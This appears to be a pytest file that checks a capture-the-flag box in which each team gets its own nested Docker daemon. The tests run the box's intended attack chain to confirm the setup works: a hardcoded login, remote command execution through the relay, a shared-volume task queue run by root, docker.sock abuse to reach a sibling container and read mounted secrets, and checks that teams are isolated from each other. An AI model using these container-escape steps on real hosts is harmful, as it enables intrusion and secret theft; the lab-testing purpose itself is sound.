"""Phase 5 verification: legendary-ferrymans-relay, Docker backend only
(this box's own design needs real Docker-socket access as part of the
puzzle -- see registry.py's NestedDockerSpec and docker_backend.py's
_provision_nested_docker_sync for why it runs its entire stack inside one
disposable nested Docker daemon per instance instead of as top-level
containers; Kubernetes-backend support is explicitly out of scope).

Unlike every other box's tests, there is no top-level
`ctf-legendary-ferrymans-relay-<team>-web` container to inspect directly
-- everything this box's own containers do happens one level down, inside
the single outer container's own nested daemon. Every check below either
goes through the published front-door ports (flags 1-2, exactly what a
real player would see) or through `docker exec <outer> docker exec
halcyon-legendary-web ...` using the box's own bundled `relay-client`
binary (flags 3-10) -- this deliberately bypasses the real SSH/relay_ops
login path (which flags 1-2's HTTP checks already prove works end to end)
to verify the orchestrator's own nested-daemon wiring -- network aliases,
socket scoping, volume reach -- not re-walk the puzzle's human-facing
difficulty, which the box's own writeup/playtesting already covers.

Requires: the box's 3 images already built
(ctf-boxes/legendary-ferrymans-relay-{web,relay,vault}:latest, see
boxes-src/legendary-ferrymans-relay/), `docker:27-dind` and `alpine:latest`
already pulled on the orchestrator host, and either a running orchestrator
reachable at ORCHESTRATOR_TEST_URL, or (default) this test will boot one
in-process against a throwaway SQLite DB and the real local Docker daemon.

These tests talk to the real Docker daemon, boot a real nested dockerd
per instance, and create/destroy real containers -- not mocked. Expect
each provision to take 10-30s (cold nested dockerd init + 3 image loads),
materially slower than every other box's tests in this project.
"""
import base64
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess
import time

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
# Randomized once per process -- same reasoning as every other test file in
# this project (see test_phase2_boxes.py's own comment): avoids collisions
# across concurrent/sequential runs of this same file.
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

BOX_ID = "legendary-ferrymans-relay"
RELAY_CLIENT = "/opt/web/downloads/relay-client"


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _outer_container_name(team_id: int) -> str:
    return f"ctf-{BOX_ID}-{team_id}-outer"[:63]


def _outer_exec(team_id: int, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["docker", "exec", _outer_container_name(team_id), *args],
        capture_output=True, text=True,
    )


def _relay_client(team_id: int, *args: str) -> str:
    """Runs the box's own bundled relay-client binary from inside the
    nested web container (docker exec <outer> docker exec web ...),
    against relay:9099 -- the real binary, the real protocol, exercising
    the --network-alias relay fix for real."""
    result = _outer_exec(team_id, "docker", "exec", "halcyon-legendary-web", RELAY_CLIENT, "relay", "9099", *args)
    assert result.returncode == 0, f"relay-client {args} failed: {result.stderr}"
    return result.stdout


def _run_via_vault(team_id: int, shell_command: str, timeout_seconds: float = 30.0) -> str:
    """Drops shell_command into vault's task queue via relay's own RUN
    RCE (the actual container-escape mechanism -- see
    boxes-src/legendary-ferrymans-relay/docker/vault/poller.sh) and
    returns /shared/task_output.txt's contents once vault's poller has
    processed it. base64-encoded to sidestep shell-quoting across the
    docker-exec/relay-protocol/bash layers; the clear-before-write step
    avoids reading stale output left over from an earlier task."""
    _relay_client(team_id, "RUN", "rm -f /shared/task_output.txt")
    b64 = base64.b64encode(shell_command.encode()).decode()
    _relay_client(team_id, "RUN", f"echo {b64} | base64 -d > /shared/task.sh")

    deadline = time.monotonic() + timeout_seconds
    while time.monotonic() < deadline:
        time.sleep(1)
        out = _relay_client(team_id, "RUN", "cat /shared/task_output.txt 2>/dev/null")
        if out.strip():
            return out
    raise AssertionError(f"vault's task queue never produced output for: {shell_command!r}")


@pytest.fixture
def legendary_instance():
    team_id = _TEAM_ID_BASE + 1
    secret = pysecrets.token_hex(32)
    r = requests.post(f"{BASE_URL}/instances", json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret})
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret
    finally:
        # Loud on purpose -- same reasoning as every other phase's own
        # teardown fixture: a silently-swallowed destroy failure here
        # would leave a stale instance that could poison a later test for
        # the same team_id.
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_flags_1_and_2_via_http(legendary_instance):
    """The real player path for the front door's two flags -- no
    docker-exec shortcuts here, this is exactly what an HTTP client sees."""
    inst, secret = legendary_instance
    index = requests.get(f"http://{inst['entry_host']}:{inst['entry_port']}/", timeout=10).text
    assert expected_flag(secret, 1) in index

    login = requests.post(
        f"http://{inst['entry_host']}:{inst['entry_port']}/login",
        data={"username": "relay_ops", "password": "ferryman2024"},
        timeout=10,
    ).text
    assert expected_flag(secret, 2) in login


def test_relay_rce_flags_3_4_5(legendary_instance):
    """VERSION (unauth) / STATUS (authed) / RUN (authed RCE) -- also the
    load-bearing proof that `--network-alias relay` actually works: if
    the nested bring-up's alias were missing or wrong, relay-client's
    connection to hostname "relay" would fail outright, not just
    produce a wrong flag."""
    inst, secret = legendary_instance

    version = _relay_client(inst["team_id"], "VERSION")
    assert expected_flag(secret, 3) in version

    status = _relay_client(inst["team_id"], "STATUS")
    assert expected_flag(secret, 4) in status

    run_out = _relay_client(inst["team_id"], "RUN", "cat /opt/relay/secret/flag5.txt")
    assert expected_flag(secret, 5) in run_out


def test_vault_container_escape_flags_6_and_7(legendary_instance):
    """The actual "container escape": relay's RUN RCE drops a task into
    the shared volume, vault's poller.sh (running as root inside vault)
    executes it and writes the result back -- pure shared-volume
    job-queue abuse, no docker.sock involved yet."""
    inst, secret = legendary_instance
    out = _run_via_vault(inst["team_id"], "cat /opt/vault/secret/flag6.txt /opt/vault/secret/flag7.txt")
    assert expected_flag(secret, 6) in out
    assert expected_flag(secret, 7) in out


def test_sibling_container_compromise_flag_8(legendary_instance):
    """Flag 8 is retrieved by vault using ITS OWN nested docker.sock to
    `docker exec` into its sibling `halcyon-legendary-web` -- proving
    that literal container name survived the resurrection unchanged, and
    that vault's socket mount really is scoped to THIS instance's own
    nested daemon (web lives on that same nested daemon, not the real
    host's)."""
    inst, secret = legendary_instance
    out = _run_via_vault(
        inst["team_id"],
        "export DOCKER_API_VERSION=1.44; docker exec halcyon-legendary-web cat /opt/web/secret/flag8.txt",
    )
    assert expected_flag(secret, 8) in out


def test_fresh_container_reaches_host_secrets_flags_9_and_10(legendary_instance):
    """Flags 9-10: vault spins up a BRAND NEW throwaway container (never
    run by this box's own bring-up) that mounts halcyon-legendary-host-
    secrets -- a volume nothing else here ever had mounted, populated
    once by the one-shot `init` container during bring-up. Flag 9 proves
    the `alpine:latest` preload fix (this nested daemon has no internet
    egress -- if alpine weren't preloaded, this step would hang/fail
    trying to pull it live). Flag 10 decrypts the dossier using the
    passphrase recovered in test_relay_rce_flags_3_4_5's flag-5 step."""
    inst, secret = legendary_instance

    flag9_out = _run_via_vault(
        inst["team_id"],
        "export DOCKER_API_VERSION=1.44; "
        "docker run --rm -v halcyon-legendary-host-secrets:/data alpine cat /data/flag9.txt",
    )
    assert expected_flag(secret, 9) in flag9_out

    passphrase_out = _relay_client(inst["team_id"], "RUN", "cat /opt/relay/secret/relay.conf")
    passphrase = next(
        line.split("=", 1)[1].strip()
        for line in passphrase_out.splitlines()
        if line.startswith("emergency_recovery_passphrase=")
    )

    flag10_out = _run_via_vault(
        inst["team_id"],
        "export DOCKER_API_VERSION=1.44; "
        "docker run --rm --entrypoint sh -v halcyon-legendary-host-secrets:/data "
        f"ctf-boxes/{BOX_ID}-vault:latest -c "
        f'"cp /data/dossier.enc /tmp/d.enc && '
        f"/opt/venv/bin/python3 /opt/shared/flagcrypto.py decrypt {passphrase} /tmp/d.enc -\"",
    )
    assert expected_flag(secret, 10) in flag10_out


def test_idempotent_create(legendary_instance):
    inst, secret = legendary_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored"},
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_destroy_leaves_no_orphans_on_real_host(legendary_instance):
    """Not just "the outer container object is gone" -- the spike that
    chose privileged dind over rootless (see the plan/memory notes)
    specifically checked this once by hand; this test makes that
    permanent. Dind forceful-removal leaving stale overlay2 mounts is a
    known, recurring upstream rough edge -- don't just assume it stays
    clean."""
    inst, secret = legendary_instance
    name = _outer_container_name(inst["team_id"])

    overlay_before = subprocess.run(["mount"], capture_output=True, text=True).stdout.count("overlay")

    resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
    resp.raise_for_status()
    time.sleep(2)

    inspect = subprocess.run(["docker", "inspect", name], capture_output=True)
    assert inspect.returncode != 0, f"{name} must be gone after destroy, not just marked destroyed in the DB"

    mounts = subprocess.run(["mount"], capture_output=True, text=True).stdout
    assert str(inst["team_id"]) not in mounts, f"orphaned mount referencing team {inst['team_id']} found after destroy"
    overlay_after = subprocess.run(["mount"], capture_output=True, text=True).stdout.count("overlay")
    assert overlay_after <= overlay_before, "destroy left behind extra overlay mounts that were not there before"

    # The fixture's own teardown will try to delete this instance again
    # (already gone) -- api/instances.py's destroy is idempotent on an
    # already-destroyed instance, same as every other box.


def test_cross_team_isolation(legendary_instance):
    """Two instances' outer containers land on Docker's own default
    bridge network (deliberately: see docker_backend.py's
    _provision_nested_docker_sync, "no network= kwarg at all" -- nothing
    else needs to reach this instance's outer container at the
    Docker-network level). That means they CAN reach each other's TCP
    port at the network layer -- confirmed directly, not assumed -- but
    each outer dind generates its own unique self-signed TLS CA at
    startup, and the Docker API on that port requires mutual TLS. This
    proves team A's own self-signed client cert is rejected by team B's
    daemon, which is where this box's actual cross-team isolation comes
    from (NOT network segmentation, which does not exist between two
    outer containers here)."""
    inst_a, secret_a = legendary_instance
    team_b = _TEAM_ID_BASE + 2
    secret_b = pysecrets.token_hex(32)
    r = requests.post(f"{BASE_URL}/instances", json={"team_id": team_b, "box_id": BOX_ID, "team_secret": secret_b})
    r.raise_for_status()
    inst_b = r.json()
    try:
        name_a = _outer_container_name(inst_a["team_id"])
        name_b = _outer_container_name(team_b)

        ip_b = subprocess.run(
            ["docker", "inspect", "-f", "{{.NetworkSettings.Networks.bridge.IPAddress}}", name_b],
            capture_output=True, text=True, check=True,
        ).stdout.strip()
        assert ip_b, "team B's outer container has no default-bridge IP -- isolation assumption below doesn't hold"

        # Sanity: confirm the TCP-level reachability this test is actually
        # probing really exists (otherwise the TLS-rejection check below
        # would trivially "pass" for the wrong reason -- no connection at
        # all, rather than a real auth rejection).
        reach = subprocess.run(
            ["docker", "exec", name_a, "docker", "-H", f"tcp://{ip_b}:2376", "ps"],
            capture_output=True, text=True,
        )
        assert "Client sent an HTTP request to an HTTPS server" in reach.stderr, (
            f"expected a TLS-required rejection proving the TCP connection itself succeeded, got: {reach.stderr}"
        )

        # The real isolation check: team A's own self-signed client cert,
        # presented to team B's daemon, must be rejected.
        auth_attempt = subprocess.run(
            [
                "docker", "exec", name_a, "docker",
                "--tlsverify",
                "--tlscacert=/certs/client/ca.pem",
                "--tlscert=/certs/client/cert.pem",
                "--tlskey=/certs/client/key.pem",
                "-H", f"tcp://{ip_b}:2376", "ps",
            ],
            capture_output=True, text=True,
        )
        assert auth_attempt.returncode != 0, "team A's client cert must NOT be accepted by team B's daemon"
        assert "certificate signed by unknown authority" in auth_attempt.stderr, (
            f"expected a cert-authority rejection, got: {auth_attempt.stderr}"
        )
    finally:
        requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}").raise_for_status()
